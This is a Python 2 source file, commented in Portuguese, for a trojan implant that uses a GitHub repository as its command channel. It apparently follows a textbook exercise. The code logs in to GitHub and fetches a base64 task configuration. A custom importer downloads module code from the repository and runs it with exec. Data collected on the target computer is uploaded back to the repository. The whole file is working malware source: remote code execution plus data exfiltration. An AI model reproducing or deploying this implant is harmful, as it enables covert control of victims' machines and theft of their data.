import json, base64, sys, time, imp, random, threading, Queue, os
from github3 import login

trojan_id = 'abc'

trojan_config = '%s.json' % trojan_id
data_path = 'data/%s/' % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue

# Realiza a autenticacao do repositorio Git e obtem objetos "repo" e "branch"
def connect_to_github():
    gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
    repo = gh.repository('testing-gt', 'cap7')
    branch = repo.branch('master')

    return gh, repo, branch


# Obtem os arquivos do repositorio e os executam localcamente
def get_file_content(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print '[*] Found file %s' % filepath
            blob = repo.blob(filename._json_data['sha'])

            return blob.content

        return None


# Obtem o documento de configuracao remoto do repositorio
# para saber quais modulos deve ser executado
def get_trojan_config():
    global configured
    #global trojan_config

    config_json = get_file_content(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])
    return config


# Envia quaisquer dados coletados no computador-alvo
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path, 'Commit message', base64.b64encode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, fullname, path=None):
        #global configured

        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            # Carregador de arquivo remoto
            new_library = get_file_content('modules/%s' % fullname)

            if new_library is not None:
                # Carregamos em nossa classe
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None


    def load_module(self, name):
        # Cria um objeto modulo vazio
        module = imp.new_module(name)
        # Insere nele o codigo obtido pelo GitHub
        exec self.current_module_code in module.__dict__
        # Insere o modulo recem-criado na lista sys.modules,
        # para ser acessado por qualquer chamada import no futuro
        sys.modules[name] = module

        return module
